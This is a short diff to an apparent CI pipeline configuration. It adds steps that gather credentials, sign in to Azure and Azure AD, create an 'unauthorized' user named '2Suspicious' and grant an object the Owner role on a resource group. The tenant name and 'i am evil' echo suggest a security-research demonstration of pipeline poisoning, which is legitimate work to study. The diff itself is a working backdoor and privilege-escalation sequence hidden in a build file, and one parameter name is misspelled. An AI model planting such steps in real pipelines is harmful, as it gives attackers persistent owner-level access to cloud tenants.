@@ -3,3 +3,11 @@ steps:
   - cmd: bash echo i am evil
   - cmd: az login --allow-no-subscriptions --identity
   - cmd: az ad group list
+  - cmd: echo "Creating unauthorized user"
+  - cmd: $pscredential = Get-Credential
+  - cmd: Connect-AzAccount -ServicePincipal -Credential $pscredential -Tenant $tenantId
+  - cmd: Connect-AzureAD # Authenticate to Azure AD
+  - cmd: New-AzureADUser -DisplayName "2Suspicious" -PasswordProfile $PasswordProfile -UserPrincipalName "suspect@ciscoswcresearch.onmicrosoft.com" -AccountEnabled $true -MailNickName "Suspect1"
+  - cmd: Get-AzADUser -StartsWith "2Sus"
+  - cmd: Get-AzRoleDefinition -Name "Owner"
+  - cmd: New-AzureRMRoleAssignment -ObjectId a26d9257-64f5-4959-b7f3-457659452e76 -RoleDefinitionName "Owner" -ResourceGroupName "SWC-Research"
